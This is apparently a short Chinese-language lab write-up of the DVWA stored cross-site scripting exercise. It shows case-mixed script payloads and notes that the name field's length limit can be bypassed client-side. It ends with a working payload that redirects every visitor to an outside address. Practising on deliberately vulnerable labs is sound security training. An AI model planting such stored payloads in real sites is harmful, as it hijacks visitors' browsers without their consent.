# Stored Cross Site Scripting (XSS)

> Objective
Redirect everyone to a web page of your choosing.

### 觀察

```jsx
<sCript> alert(1) </sCript>
```
經過測試後你會發現第一個 name input 防護比較脆弱，有機可趁，但有限制長度，不過可以直接從前端修改 input 長度，後端並沒有檢查

![](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/b5a642e8-bb12-41ae-804f-94c492a9e176/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45EIPT3X45%2F20220218%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20220218T130925Z&X-Amz-Expires=86400&X-Amz-Signature=45b26373b1f0558584550dad4d4b38ccbb4e49b29923287da0c9cd43cc9b3765&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22&x-id=GetObject)

### Done

```
<sCript>location.href="https://1.1.1.1"</sCript>
```
```
http://dvwa.localtest/vulnerabilities/xss_s/
```

被重導到 1.1.1.1 了
